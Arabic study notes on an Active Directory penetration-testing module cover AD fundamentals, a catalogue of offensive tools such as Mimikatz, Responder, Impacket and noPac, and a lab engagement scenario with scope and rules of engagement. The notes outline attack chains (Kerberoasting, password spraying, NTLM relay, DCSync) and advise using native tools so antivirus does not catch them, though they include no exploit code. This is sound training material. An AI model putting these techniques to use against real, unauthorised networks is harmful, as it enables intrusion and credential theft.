# Layer 1
## أولًا: يعني إيه Active Directory (AD)؟

تخيل إنك عندك شركة فيها:

- 500 موظف
    
- 1000 جهاز كمبيوتر
    
- طابعات
    
- سيرفرات
    
- ملفات
    
- صلاحيات
    
- إيميلات
    

لو كل جهاز بيتدار لوحده، هتبقى كارثة.

هنا بيجي دور **Active Directory**.

## تعريفه

Active Directory أو اختصارًا **AD** هو نظام عملته Microsoft علشان يدير كل الشركة من مكان واحد.

يعني بدل ما تروح لكل جهاز تغير الباسورد أو تضيف يوزر...

كل ده بيتعمل من سيرفر واحد.

يعني يعتبر:

> هو قاعدة بيانات كبيرة فيها كل معلومات الشركة.

زي:

- الموظفين
    
- الأجهزة
    
- الجروبات
    
- الصلاحيات
    
- الشيرد فولدرز
    
- الطابعات
    
- السيرفرات
    

---

## اتعمل إمتى؟

بيقول:

> officially implemented in 2000 with Windows Server 2000

يعني ظهر رسميًا سنة 2000 مع Windows Server 2000.

ومن وقتها كل نسخة ويندوز سيرفر كانت بتضيفله Features جديدة.

---

## هو مبني على إيه؟

بيقول:

> AD is based on x.500 and LDAP

يعني AD معتمد على بروتوكولات قديمة اسمها

- X.500
    
- LDAP
    

---

## يعني إيه LDAP؟

دي من أهم الحاجات.

LDAP = Lightweight Directory Access Protocol

ببساطة...

هو البروتوكول اللي بيخليك تسأل الـ Active Directory.

يعني بدل ما تقول

"فين الموظف أحمد؟"

أنت بتبعت LDAP Query.

مثال:

```
هاتلي كل اليوزرز

```

أو

```
هاتلي اليوزر Mohab

```

أو

```
مين في جروب Domain Admins؟

```

يبقى LDAP هو لغة الكلام مع الـ AD.

---

## كلمة Distributed معناها إيه؟

بيقول

> distributed

يعني البيانات مش شرط تبقى على سيرفر واحد.

ممكن يبقى عندك:

القاهرة

↓

Domain Controller

والإسكندرية

↓

Domain Controller

والاتنين متزامنين.

---

## Hierarchical Structure

يعني البيانات مترتبة في شكل شجرة.

مثلاً

```
Company

    Egypt

        IT

            Ahmed

            Ali

        HR

            Sara

    UAE

        IT
		        Karim

```

كل حاجة تحت حاجة.

زي فولدرات.

---

## Centralized Management

دي أهم ميزة.

يعني بدل ما تعدي على 1000 جهاز...

كل حاجة من مكان واحد.

مثلاً:

تغير باسورد موظف

↓

مرة واحدة

يقفله الإيميل

↓

مرة واحدة

تمسحه

↓

مرة واحدة

---

## Resources يعني إيه؟

بيقول

Resources

ويقصد:

أي حاجة الشركة بتملكها.

زي

Users

↓

الموظفين

Computers

↓

الأجهزة

Groups

↓

الجروبات

Network Devices

↓

راوترات وسويتشات

File Shares

↓

الفولدرات المشتركة

Group Policies

↓

سياسات الويندوز

Devices

↓

أي أجهزة

Trusts

↓

العلاقات بين Domains.

---

## يعني إيه Trust؟

دي مهمة جدًا.

لو عندك شركتين

```
Company A

Company B

```

وعامل بينهم Trust

يبقى يوزر من الشركة الأولى ممكن يدخل موارد الشركة التانية حسب الصلاحيات.

وده هتشوفه كتير في الاختراق.

---

## Authentication

بيقول

AD provides Authentication

يعني التأكد إنك مين.

مثلاً

أنت كتبت

```
Mohab

Password123

```

الـ AD بيقول

هل فعلاً ده Mohab؟

لو آه

يبقى دخل.

---

## Authorization

غير Authentication.

Authentication

↓

مين أنت؟

Authorization

↓

تعمل إيه؟

مثال

Mohab

↓

مسموح يفتح HR Folder؟

لا

مسموح يفتح IT Folder؟

آه

---

## Accounting

يعني تسجيل كل العمليات.

مثلاً

Mohab عمل Login

↓

اتسجل.

فتح File

↓

اتسجل.

غير باسورد

↓

اتسجل.

---

## ليه إحنا نهتم بالـ AD؟

بيقول

Microsoft Active Directory حوالي 43% من سوق الشركات.

يعني تقريبًا نص الشركات الكبيرة شغالة بيه.

وده معناه...

لو عايز تبقى Pentester

أو Red Teamer

لازم تعرف AD.

---

## Azure AD

بيقول

Microsoft blending with Azure AD

يعني Microsoft بقت تربط الـ Active Directory التقليدي مع الـ Cloud.

دلوقتي اسمه غالبًا Microsoft Entra ID.

---

## CVE

بيقول

Microsoft has over 2000 CVEs

يعني فيه أكتر من 2000 ثغرة منشورة.

---

يعني إيه CVE؟

Common Vulnerabilities and Exposures

رقم بيميز كل ثغرة.

زي

```
CVE-2021-34527

```

ودي PrintNightmare.

---

## ليه الـ AD بيتخترق بسهولة؟

بيقول

مش لأنه وحش.

لكن لأنه ضخم جدًا.

فيه:

Users

Computers

Permissions

Services

DNS

LDAP

Kerberos

SMB

GPO

Certificates

Delegation

Trusts

....

فغلط صغير

↓

يبقى Domain كله وقع.

---

## Misconfiguration

يعني سوء إعداد.

مثلاً

User واخد صلاحيات زيادة.

أو

Folder Everyone Full Control.

أو

Service Account باسورده ضعيف.

كل دي Misconfigurations.

---

## Enumeration

دي أهم كلمة في الموديول.

Enumeration

يعني

جمع معلومات.

مش اختراق.

لسه.

يعني أعرف:

- اليوزرز
    
- السيرفرات
    
- الجروبات
    
- الدومين
    
- الصلاحيات
    

---

## Native Tools

يعني أدوات موجودة أصلًا في ويندوز.

مش محتاج تنزل حاجة.

---

## Sysinternals

دي مجموعة Tools من Microsoft.

زي

PsExec

Autoruns

Process Explorer

---

## WMI

Windows Management Instrumentation

تقدر تسأل الويندوز عن أي حاجة.

مثلاً

```
كام رامات؟

```

```
إيه البرامج؟

```

```
مين Logged in؟

```

---

## DNS

عارفه.

لكن في الـ AD ليه دور ضخم.

لأن الأجهزة بتلاقي بعض عن طريق DNS.

---

## Password Spraying

ودي هتسمعها كتير.

مش معناها أجرب مليون باسورد على يوزر واحد.

دي اسمها Brute Force.

Password Spraying

↓

باسورد واحد

على كل اليوزرز.

مثلاً

```
Welcome123

```

على

Ahmed

Ali

Sara

Mohab

...

علشان متعملش Lockout.

---

## Kerberoasting

واحدة من أشهر هجمات الـ AD.

الفكرة ببساطة:

فيه Service Accounts.

تقدر تطلب Ticket ليهم.

وبعدين تكسر الـ Ticket Offline.

ولو الباسورد ضعيف

↓

عرفت الباسورد.

---

## Responder

أداة بتسرق NetNTLM Hashes.

بتستنى أي جهاز يطلب Authentication.

وتاخد الـ Hash.

---

## Kerbrute

بتستخدمه تعرف

هل Username موجود؟

بدون Password.

---

## BloodHound

أهم Tool في AD تقريبًا.

بيعمل Map.

ويرسم العلاقات.

مثلاً

```
Mohab

↓

Member Of

↓

IT Support

↓

GenericAll

↓

Server01

↓

Session

↓

Domain Admin

```

ويقولك

أهو الطريق اللي هيوصلك للدومين أدمن.

---

## الهدف من Pentest في AD

بيقول

مش شرط Domain Admin.

ممكن العميل يقولك:

هاتلي:

- Database
    
- Email
    
- Server معين
    
- File Share
    

أو

هاتلي Domain Admin.

---

## Foothold

يعني أول رجل ليك جوه الشركة.

مثلاً

اخترقت جهاز واحد.

ده اسمه

Foothold.

---

## Lateral Movement

يعني تتحرك أفقيًا.

من جهاز

↓

جهاز.

---

## Vertical Movement

يعني تطلع صلاحيات.

User

↓

Local Admin

↓

Server Admin

↓

Domain Admin.

---

## Living Off The Land

ودي مهمة جدًا.

يعني تستخدم أدوات ويندوز نفسها.

بدل

Mimikatz

تستخدم

PowerShell

أو

wmic

أو

net

أو

dsquery

علشان الـ AV ميكشفكش.

---

## ليه لازم تتعلم Manual Enumeration؟

لأن الأدوات ممكن:

- تقع
    
- تتمنع
    
- الـ AV يمنعها
    
- العميل يمنع رفع ملفات
    

فساعتها لازم تعرف تعمل كل حاجة بإيدك.

---

## Scenario 1

بيقول:

اخترق جهاز.

أخد SYSTEM.

## يعني SYSTEM؟

أعلى صلاحية على الجهاز.

أعلى من Administrator.

---

بعدها عمل Enumeration.

ملقاش حاجة.

فجرب Kerberoasting.

جاب Tickets.

كسرها بـ Hashcat.

---

## Hashcat

أداة كسر Password Hashes.

---

لقى Password.

لكن اليوزر مش مهم.

عمل إيه؟

استغل صلاحياته على File Share.

ورمى ملفات SCF.

---

## SCF File

ملف لما حد يفتحه

يحاول يعمل Authentication.

فتطلع الـ Hash للـ Attacker.

---

شغل Responder.

استنى.

لقى Hash.

طلع Domain Admin.

خلصت.

---

## Scenario 2

لقى SMB NULL Session.

---

## SMB

بروتوكول مشاركة الملفات.

---

## NULL Session

يعني دخل بدون Username أو Password.

وده Misconfiguration.

جاب:

Users

Password Policy

---

عرف:

Minimum Password

8

وعرف Complexity.

---

جرب Password Spraying.

لقى User.

---

بعدها BloodHound.

لقى Local Admin.

دخل الجهاز.

لقى Domain Admin فاتح Session.

---

استخدم

Rubeus.

---

## Rubeus

Tool للـ Kerberos.

استخرج TGT.

---

## TGT

Ticket Granting Ticket.

دي أول Ticket بتاخدها لما تعمل Login.

---

بعدها عمل

Pass The Ticket.

---

## Pass The Ticket

بدل الباسورد

تستخدم الـ Ticket نفسه.

---

وبعدين سيطر على دومين تاني بسبب Trust.

---

## Scenario 3

كل الطرق فشلت.

راح استخدم

Kerbrute.

طلع Username صحيح.

---

جاب Usernames من LinkedIn.

يعني الموظفين.

---

عمل Password Spraying.

لقى يوزر.

---

شغل BloodHound.

لقى كل الناس تقدر تعمل RDP.

---

## RDP

Remote Desktop.

يعني تدخل الجهاز كأنك قاعد قدامه.

---

دخل.

استعمل

DomainPasswordSpray.

ميزة الأداة إنها متقفّلش الحسابات (بتستبعد اللي قربت توصل لحد الـ Lockout).

---

لقى User في Help Desk.

Help Desk عنده

GenericAll.

---

## GenericAll

يعني تحكم كامل.

---

على Enterprise Key Admins.

ودي لها تحكم على Domain Controller.

---

أضاف نفسه.

وراح عامل

Shadow Credentials.

---

## Shadow Credentials

هجوم بيضيف Credential جديد للـ Account بدون ما يعرف الباسورد.

---

جاب NT Hash.

---

## NT Hash

الـ Hash بتاع باسورد الويندوز.

---

بعدها عمل

DCSync.

---

## DCSync

من أخطر هجمات الـ AD.

بتخدع الـ Domain Controller إنه يعملك Replication.

فيديك Hashes كل المستخدمين.

ومن ضمنهم Domain Admin.

---

## الرسالة الأساسية من المقدمة

المؤلف عايز يقولك 3 حاجات مهمين جدًا:

1. **الـ Enumeration أهم من الهجوم نفسه.** لو عرفت تجمع معلومات صح، غالبًا هتعرف توصل لهدفك بسهولة.
    
2. **الـ Active Directory مليان علاقات وصلاحيات معقدة.** أوقات حساب عادي جدًا يوصلك لـ Domain Admin بسبب Misconfiguration بسيطة.
    
3. **اتعلم الأساس قبل الأدوات.** BloodHound وResponder وKerbrute ممتازين، لكن لو الأداة وقعت أو اتمنعت، لازم تبقى فاهم إيه اللي بيحصل وتعرف تعمله بإيدك.
    

---

دي مجرد **المقدمة** للموديول. بعد كده كل Tool وكل Attack (زي Kerberoasting وBloodHound وPassword Spraying وDCSync) هيتشرح بالتفصيل العملي، وإزاي تستخدمه في اللابات.


----------------
# Layer 2
 الجزء ده عبارة عن **أدوات الشغل (Tools of the Trade)**، يعني الأدوات اللي أي **Pentester أو Red Teamer** بيستخدمها وهو بيشتغل على Active Directory. 
 
---

## أولًا: يعني Tools of the Trade؟

يعني:

> الأدوات الأساسية اللي هنستخدمها طول الموديول.

الموديول بيقول:

- لو بتشتغل من Windows هتلاقي الأدوات في:
    

```text
C:\Tools
```

- لو بتشتغل من Linux هيديك Parrot OS جاهز.
    

يعني مش هتقعد تنزل حاجة.

كل الأدوات موجودة.

---

## PowerView / SharpView

دي من أهم الأدوات.

## PowerView

عبارة عن PowerShell Script.

يعني بتشغله على Windows.

## SharpView

نفس PowerView

لكن معمول بلغة C#.

يعني Executable.

---

## بيعملوا إيه؟

يجمعوا معلومات عن الـ Active Directory.

مثلاً

- مين اليوزرز؟
    
- مين الأدمن؟
    
- مين واخد صلاحيات؟
    
- مين داخل دلوقتي؟
    
- مين عنده SPN؟
    
- مين ينفع نعمله Kerberoast؟
    

---

مثال

بدل ما تكتب

```powershell
net user
```

PowerView يجيبلك معلومات أكتر بكتير.

---

## ليه الناس بتحبه؟

لأنه بيشتغل باستخدام PowerShell.

وده يعتبر

Living Off The Land.

يعني مش محتاج تنزل Tool كبيرة.

---

## BloodHound

أشهر Tool في الـ AD.

ودي لازم تحفظها.

---

بدل ما يبقى عندك آلاف اليوزرز والجروبات...

BloodHound يعملهم Graph.

مثلاً

```text
Mohab

↓

Member Of

↓

IT Support

↓

GenericAll

↓

Server01

↓

Session

↓

Domain Admin
```

فيقولك

أهو الطريق اللي يخليك توصل لـ Domain Admin.

---

يعني هو مش بيخترق.

هو بيرسم العلاقات.

---

## SharpHound

ناس كتير بتتلخبط بينه وبين BloodHound.

لازم تفرق بينهم.

## SharpHound

هو Collector.

يعني يجمع المعلومات.

---

## BloodHound

هو Viewer.

يعني يعرض المعلومات.

---

تخيلهم بالشكل ده

```text
SharpHound

↓

يجمع البيانات

↓

JSON

↓

BloodHound

↓

يعرضها في Graph
```

---

SharpHound بيجمع

- Users
    
- Groups
    
- Sessions
    
- ACL
    
- GPO
    
- Computers
    

وغيرهم.

---

## BloodHound.py

دي نسخة Python.

---

ليه موجودة؟

لو أنت على Linux.

أو

الجهاز بتاعك مش داخل الدومين.

---

بدل SharpHound

تشغل

BloodHound.py

ويطلع نفس JSON تقريبًا.

---

## Kerbrute

أداة مكتوبة بلغة Go.

بتستخدم Kerberos.

---

بتعمل 3 حاجات.

## أولًا

User Enumeration.

يعني تعرف

هل اليوزر موجود؟

---

مثلاً

```text
Ahmed

Ali

Mohab

Sara
```

تجرب.

اللي موجود هيقولك.

---

## ثانيًا

Password Spray.

---

يعني

```text
Welcome123
```

على كل اليوزرز.

---

## ثالثًا

Brute Force.

لكن ده أقل استخدامًا.

---

## Impacket Toolkit

دي مش أداة.

دي مكتبة.

فيها أدوات كتير جدًا.

تقريبًا نص أدوات الـ AD جاية منها.

---

زي

```text
psexec.py

wmiexec.py

secretsdump.py

GetNPUsers.py

lookupsid.py

ticketer.py

...
```

---

كلهم Python.

---

## Responder

دي من أشهر الأدوات.

---

بتعمل

LLMNR Poisoning

NBT-NS Poisoning

MDNS Poisoning

---

يعني إيه Poisoning؟

يعني تخدع الأجهزة.

---

مثلاً

جهاز بيسأل

```text
فين السيرفر FILE01؟
```

Responder يرد

```text
أنا FILE01
```

الجهاز يبعتله Username والـ Hash.

---

وبالتالي

تسرق

NetNTLM Hash.

---

## Inveigh.ps1

Responder

لكن PowerShell.

---

بيستخدم على Windows.

---

## InveighZero

نسخة C#.

أسرع.

وأحسن في البيئات الحديثة.

---

## rpcinfo

RPC

يعني Remote Procedure Call.

---

الأداة دي تسأل الجهاز

إيه خدمات الـ RPC اللي شغالة؟

---

مثلاً

```bash
rpcinfo -p 10.0.0.1
```

هيقولك

- Port
    
- Service
    
- Protocol
    

---

## rpcclient

جزء من Samba.

بيستخدم RPC.

---

ومن خلاله تقدر

تجيب

Users

Groups

Policies

Shares

وغيرهم.

---

## CrackMapExec (CME)

دي من أقوى الأدوات.

ناس كتير بتسميها

Swiss Army Knife.

---

بتعمل

Enumeration

Authentication

Password Spray

Command Execution

Post Exploitation

---

بتشتغل على

SMB

WMI

WinRM

MSSQL

---

يعني Tool واحدة

بتعمل نص الشغل.

---

## Rubeus

أداة متخصصة في Kerberos.

---

بتعمل

Kerberoasting

Pass The Ticket

Pass The Key

TGT

TGS

S4U

Delegation

وغيرهم.

---

## GetUserSPNs.py

من Impacket.

---

بيجيب

Service Principal Names.

---

ليه؟

علشان تعمل

Kerberoasting.

---

## Hashcat

أشهر Password Cracker.

---

مثلاً

عندك

NTLM Hash

أو

Kerberos Hash

تحطه فيه.

يحاول يجيب الباسورد.

---

## enum4linux

أداة Enumeration قديمة.

---

بتجيب

Users

Shares

OS

Groups

Policy

من Samba أو Windows.

---

## enum4linux-ng

نسخة أحدث.

أسرع.

وأدق.

---

## ldapsearch

موجودة في Linux.

---

بتكلم LDAP مباشرة.

مثلاً

```text
هات كل اليوزرز
```

أو

```text
هات كل الجروبات
```

---

## windapsearch

سكريبت Python.

---

بيسهل كتابة LDAP Queries.

بدل ما تكتب LDAP معقد.

---

## DomainPasswordSpray.ps1

PowerShell Tool.

---

بيعمل Password Spray.

---

ميزته

يحترم Password Policy.

ويبعد عن Lockout.

---

## LAPSToolkit

أداة خاصة بـ

LAPS.

---

يعني

Local Administrator Password Solution.

---

LAPS

Microsoft بتخلي كل جهاز

له Local Admin Password مختلف.

---

الأداة دي تشوف

هل فيه مشاكل في إعدادات LAPS؟

---

## smbmap

بيجيب

كل SMB Shares.

---

ويقولك

دي Read

ولا Write

ولا No Access.

---

## psexec.py

من Impacket.

---

زي PsExec.

---

لو عندك Username وPassword

تدخل Shell.

---

## wmiexec.py

زي psexec

لكن باستخدام

WMI.

---

أوقات بيكون أقل Detect.

---

## Snaffler

اسمه غريب 😂

---

يدور في الشيرد فولدرز.

على

Passwords

VPN Files

Config Files

Certificates

Secrets

---

## smbserver.py

يشغل SMB Server عندك.

---

ليه؟

لو عايز تنقل ملف للويندوز.

---

بدل FTP.

---

## setspn.exe

أداة من Microsoft.

---

تقرأ

SPNs

أو تضيفها

أو تمسحها.

---

## Mimikatz

ملك أدوات الويندوز.

---

بيعمل

Pass The Hash

Pass The Ticket

Credential Dumping

LSASS Dump

Kerberos Extraction

Plaintext Passwords

Golden Ticket

Silver Ticket

تقريبًا أي حاجة.

---

## secretsdump.py

من Impacket.

---

يسحب

SAM

LSA Secrets

NTLM Hashes

من الجهاز.

---

## evil-winrm

لو WinRM مفتوح.

---

يديك Interactive Shell.

---

مفضل جدًا في الـ Labs.

---

## mssqlclient.py

يدخل على

Microsoft SQL Server.

---

ممكن تنفذ Commands.

أو تقرأ الداتا.

---

## noPac.py

Exploit مشهور.

---

بيستغل

CVE-2021-42278

CVE-2021-42287

---

علشان يرفع User عادي

إلى

Domain Admin.

---

## rpcdump.py

يعرض

RPC Endpoints.

---

بيفيد في Enumeration.

---

## CVE-2021-1675.py

PoC

لثغرة

PrintNightmare.

---

## ntlmrelayx.py

أداة Relay.

---

يعني بدل ما تكسر الـ Hash.

تنقله مباشرة لسيرفر تاني.

---

## PetitPotam.py

أداة بتجبر جهاز ويندوز

يبعت Authentication.

---

بعدها تعمل

NTLM Relay.

---

## gettgtpkinit.py

تتعامل مع

Certificates.

وتطلع

TGT.

---

## getnthash.py

لو معاك TGT.

تجيب

NT Hash.

---

## adidnsdump

يطلع كل

DNS Records

في الدومين.

---

زي

DNS Zone Transfer.

---

## gpp-decrypt

زمان

Group Policy

كانت بتحفظ Password مشفر.

---

الأداة دي

تفك التشفير.

---

## GetNPUsers.py

دي خاصة بـ

ASREPRoasting.

---

تجيب

AS-REP Hash

لليوزرز اللي

Kerberos Preauthentication

متقفلة عندهم.

---

بعدها

Hashcat.

---

## lookupsid.py

يعمل

SID Brute Force.

---

يعرف

Users

Groups

عن طريق SID.

---

## ticketer.py

يصنع

Kerberos Tickets.

---

زي

Golden Ticket

Silver Ticket.

---

## raiseChild.py

لو فيه

Child Domain

و

Parent Domain.

---

يحاول يرفع صلاحياتك

من Child

إلى Parent.

---

## Active Directory Explorer

برنامج GUI.

---

يفتحلك الـ AD

زي File Explorer.

---

تشوف

Users

Groups

ACL

Attributes

بسهولة.

---

ممكن كمان

تاخد Snapshot

للـ AD.

وتحلله Offline.

---

## PingCastle

من أشهر أدوات

Security Audit.

---

يطلع Report.

ويقولك

المخاطر الموجودة.

ويرتبها حسب الخطورة.

---

## Group3r

خاص بالـ GPO.

---

يدور على

Misconfigurations

داخل

Group Policy.

---

## ADRecon

يجمع معلومات ضخمة عن الدومين.

---

ويطلعها في

Excel.

---

فيه:

- Users
    
- Groups
    
- Computers
    
- Trusts
    
- GPO
    
- Password Policy
    
- ACL
    
- Delegation
    

وغيرهم.

مفيد جدًا لما تبقى عايز تعمل تقرير عن بيئة الـ Active Directory.

---

## ملخص سريع (احفظه)

|الأداة|وظيفتها الأساسية|
|---|---|
|**PowerView**|جمع معلومات عن الـ AD من PowerShell|
|**BloodHound**|رسم العلاقات واكتشاف مسارات الهجوم|
|**SharpHound**|جمع بيانات لـ BloodHound|
|**Kerbrute**|User Enumeration + Password Spraying|
|**Impacket**|مجموعة أدوات هجوم على بروتوكولات ويندوز|
|**Responder**|سرقة NetNTLM Hashes|
|**CrackMapExec**|Enumeration وهجمات متعددة على SMB/WMI/WinRM|
|**Rubeus**|هجمات Kerberos|
|**Hashcat**|كسر الـ Hashes|
|**Mimikatz**|استخراج كلمات المرور والتذاكر والهاشات|
|**evil-winrm**|Interactive Shell عبر WinRM|
|**secretsdump.py**|استخراج SAM وLSA وNTLM Hashes|
|**GetNPUsers.py**|تنفيذ ASREPRoasting|
|**GetUserSPNs.py**|تنفيذ Kerberoasting|
|**Snaffler**|البحث عن كلمات مرور وملفات حساسة داخل الـ Shares|
|**PingCastle**|تدقيق أمان بيئة الـ Active Directory|
|**ADRecon**|جمع معلومات شاملة وإخراجها في تقرير Excel|

💡 **نصيحة للمذاكرة:** مش مطلوب تحفظ كل الأوامر دلوقتي. ركز الأول على **وظيفة كل أداة**، ولما تبدأ اللابات العملية هتستخدم كل أداة في وقتها، وساعتها الأوامر هتثبت معاك تلقائيًا.


------
# Layer 3
 الجزء ده مهم جدًا لأنه بيحطك في **سيناريو حقيقي** كأنك شغال Pentester في شركة. يعني من أول هنا، الموديول مش هيبقى مجرد شرح أدوات، لأ، هيخليك تمشي في Assessment كامل خطوة بخطوة.

---

## Scenario

بيقول:

> We are Penetration Testers working for CAT-5 Security

يعني من دلوقتي اعتبر نفسك موظف في شركة اسمها

**CAT-5 Security**

ودي شركة بتقدم خدمات

- Penetration Testing
    
- Red Team
    
- Security Assessment
    

---

## بعدين بيقول

> After a few successful engagements

### يعني إيه Engagement؟

دي كلمة هتسمعها كتير في الشركات.

Engagement = مشروع أو عملية اختبار أمن كاملة.

يعني الشركة جالها عميل وقالها:

> تعالى اختبرلي الشبكة.

ده اسمه Engagement.

---

هو بيقول:

أنت اشتغلت مع الفريق في كام مشروع قبل كده.

وكان أداؤك كويس.

---

## shadowing with the team

يعني

كنت شغال مع Senior Pentester.

بتتفرج عليه.

وتساعده.

وتتعلم.

---

دلوقتي قالوا:

خلينا نشوف هتعرف تشتغل لوحدك ولا لأ.

---

## Team Lead

بيقول

> Team Lead sent us an email

يعني قائد الفريق بعتلك Email.

فيه المطلوب.

---

## Tasking Email

دي أهم حاجة.

هي فيها المطلوب منك في الاختبار.

---

## أول Task

> Domain Enumeration

يعني

اجمع معلومات عن الـ Domain.

وده أول خطوة في أي Pentest.

---

يعني تعرف

- اسم الدومين
    
- اليوزرز
    
- الجروبات
    
- السيرفرات
    
- الـ DC
    
- الـ Shares
    
- الـ Trusts
    
- الـ GPO
    
- Password Policy
    

---

## Credential Discovery

يعني

دور على Credentials.

يعني

Username

Password

Hash

Kerberos Ticket

Certificate

API Keys

Secrets

أي حاجة تدخل بيها.

---

## Lateral Movement

دي اتكلمنا عنها.

يعني

من جهاز

↓

جهاز تاني.

---

مثلاً

```text
PC01

↓

Server01

↓

FileServer

↓

DC
```

---

## Privilege Escalation

يعني

ترفع صلاحياتك.

مثلاً

```text
User

↓

Local Admin

↓

Server Admin

↓

Domain Admin
```

---

## Acquire Domain Admin Credentials

يعني

الهدف النهائي.

إنك تجيب Credentials بتاعة

Domain Admin.

مش شرط الباسورد.

ممكن

Hash

أو

Ticket.

---

## Findings will guide further actions

يعني

كل معلومة هتجمعها

هتحدد هتعمل إيه بعد كده.

وده مهم جدًا.

---

مثلاً

لقيت

```text
Password Never Expires
```

يبقى ممكن تعمل

Password Spray.

---

لقيت

SPN.

يبقى

Kerberoasting.

---

لقيت

Sessions.

يبقى

Pass The Ticket.

---

## This module will allow us to practice

يعني

كل اللي هنتعلمه

هنطبقه.

---

## Final Assessment

دي الامتحان النهائي.

---

هيخليك تعمل

Internal Penetration Test

مرتين.

---

## أول مرة

بيقول

> Starting from an external breach position

يعني

كأنك Hacker

اخترقت الشركة من بره.

ودخلت جهاز.

---

يبقى البداية

جهاز واحد.

---

بعدها

تحاول توصل للدومين.

---

## ثاني مرة

بيقول

> attack box inside the internal network

يعني

العميل مديلك

جهاز

جوه الشركة.

---

يعني أنت بالفعل داخل الشبكة.

---

وده بيحصل فعلًا.

مثلاً

شركة تقول

"احنا عاوزين نعرف لو موظف خبيث موجود جوه الشركة."

---

## Skills Assessment

يعني

الامتحان العملي.

---

لما تخلصه

يبقى أنت عرفت

- Enumeration
    
- Exploitation
    
- Privilege Escalation
    
- Lateral Movement
    

---

## Automated and Manual

دي نقطة مهمة.

بيقول

مش عايزينك تعرف تشغل Tools بس.

لا.

عايزينك تعرف تعمل الحاجة بإيدك.

---

يعني

BloodHound

كويس.

لكن تعرف تجيب نفس المعلومات بـ LDAP؟

---

Responder

كويس.

لكن فاهم هو بيعمل إيه؟

---

## Attack Concepts

يعني

طرق الهجوم.

---

مش مجرد Commands.

لكن

ليه بنستخدمها؟

وإمتى؟

---

## Interpret Data

دي من أهم مهارات الـ Pentester.

يعني

تعرف تفسر البيانات.

---

مثلاً

جبت Users.

طيب بعدين؟

---

جبت Sessions.

طيب تعمل بيها إيه؟

---

جبت ACL.

طيب مين Vulnerable؟

---

دي اسمها

Interpretation.

---

## Assessment Scope

دي من أهم الوثائق.

---

Scope

يعني

إيه المسموح تختبره.

---

وده قانونيًا مهم جدًا.

---

	## In Scope

يعني

مسموح.

---

## أول حاجة

```text
INLANEFREIGHT.LOCAL
```

ده

Main Domain.

---

وفيه

- Active Directory
    
- Web Services
    

---

## ثاني حاجة

```text
LOGISTICS.INLANEFREIGHT.LOCAL
```

Subdomain.

---

يعني

دومين تابع للدومين الأساسي.

---

## ثالث حاجة

```text
FREIGHTLOGISTICS.LOCAL
```

شركة تابعة.

---

بيقول

> Subsidiary Company

يعني

شركة مملوكة للشركة الأساسية.

---

## External Forest Trust

دي مهمة جدًا.

---

يعني

فيه Trust

بين

```text
INLANEFREIGHT

↓

FREIGHTLOGISTICS
```

---

وده معناه

لو اخترقت واحدة

ممكن تروح للتانية.

---

وده هتشوفه بعدين.

---

## 172.16.5.0/23

ده

Subnet.

---

يعني

كل الأجهزة

اللي IP بتاعها

في الرينج ده

مسموح تختبرها.

---

## Out Of Scope

يعني

ممنوع.

---

مثلاً

أي دومين تاني.

---

أي Subdomain تاني.

---

أي IP مش مكتوب.

---

## ممنوع تعمل

Phishing.

---

يعني

مينفعش تبعت Email مزيف.

---

ولا

Social Engineering.

---

يعني

متتصلش بالموظفين.

---

ولا تخدع حد.

---

## Real Website

بيقول

ممنوع

تهاجم

```text
inlanefreight.com
```

---

ليه؟

لأنه

موقع حقيقي.

---

مسموح فقط

Passive Enumeration.

---

## Passive Enumeration

يعني

جمع معلومات

بدون لمس السيرفر.

---

زي

Google

LinkedIn

GitHub

WHOIS

DNS

Certificate Transparency

Shodan

Archive.org

---

كل ده

Passive.

---

## Active Enumeration

عكسه.

---

يعني

Port Scan

Nmap

Dirsearch

Nikto

Gobuster

Burp

---

كل ده

يبعت Packets.

---

وده ممنوع.

---

## Internal Testing

ده الجزء العملي.

---

بيقول

هنختبر

الأجهزة الداخلية.

---

خصوصًا

Active Directory.

---

## Emulate Attack

يعني

نحاكي

هاكر حقيقي.

---

مش مجرد

Run Tool.

---

## Untrusted Insider Perspective

يعني

اعتبر نفسك

موظف عادي.

---

مش Admin.

---

مش معاك Passwords.

---

ولا أي معلومات.

---

وده أقرب للحقيقة.

---

## No advance information

يعني

مش هيدوك

Network Diagram.

---

ولا Users.

---

ولا Password.

---

أنت هتكتشف كل حاجة.

---

## Goal

الهدف.

---

أولًا

Get Domain User.

---

يعني

جيب أي User.

---

بعدها

Enumeration.

---

بعدها

Foothold.

---

يعني

امسك جهاز.

---

بعدها

Lateral Movement.

---

بعدها

Vertical Movement.

---

لحد

Domain Admin.

---

## Computer systems will not be interrupted

يعني

مينفعش

توقع الشبكة.

---

ولا تعمل

Denial of Service.

---

ولا تمسح ملفات.

---

ولا توقف Services.

---

لأن الهدف

اختبار

مش تخريب.

---

## Password Testing

بيقول

لو لقينا Hashes.

---

مسموح

ناخدها

ونكسرها

Offline.

---

## Offline Cracking

يعني

تاخد الـ Hash.

---

تروح

على جهازك.

---

وتشغل

Hashcat.

---

مش على سيرفر العميل.

---

وده أسرع.

وأأمن.

---

## Confidentiality

بيقول

أي Password

هنعرفه

مش هيتقال

لحد بره الفريق.

---

وده مهم جدًا.

---

كل الداتا

تتحفظ

بشكل آمن.

---

## ليه ورانا الـ Scope ده؟

بيقول

علشان

تتعود.

---

لأن أي شغل Pentest

هيبقى فيه

- Scope
    
- Rules of Engagement (RoE)
    
- NDA
    
- Timeline
    
- Objectives
    

---

## يعني إيه Rules of Engagement (RoE)؟

دي "قواعد الاشتباك".

يعني وثيقة بتحدد:

- إيه المسموح تعمله.
    
- إيه الممنوع تعمله.
    
- إمتى تشتغل.
    
- مين تبلغ لو لقيت مشكلة خطيرة.
    
- إزاي تتعامل مع البيانات اللي تجمعها.
    

وجودها بيحمي العميل وبيحمي فريق الاختبار قانونيًا.

---

## The Stage Is Set

دي جملة معناها

> كل حاجة بقت جاهزة.

---

يعني

عرفنا

- الهدف
    
- الـ Scope
    
- الأدوات
    
- القوانين
    

---

دلوقتي هنبدأ

أول مرحلة.

---

## Passive External Enumeration

ودي أول خطوة.

---

هنجمع معلومات

من بره الشركة.

بدون

أي Scan.

---

زي ما أي Hacker هيبدأ.

---

## ملخص السيناريو كله

تخيل نفسك دخلت أول يوم شغل في شركة **CAT-5 Security**، ومدير الفريق قالك:

> "قدامك عميل اسمه **Inlanefreight**. دي حدود الشغل (Scope)، ودي قواعد الاختبار (RoE). مطلوب تبدأ من الصفر، تجمع معلومات عن البيئة، تلاقي أي بيانات دخول، تدخل الشبكة، تتحرك بين الأجهزة، ترفع صلاحياتك، وفي الآخر توصل إلى **Domain Admin**—كل ده من غير ما تخرج برا النطاق المسموح أو تعطل أنظمة العميل."

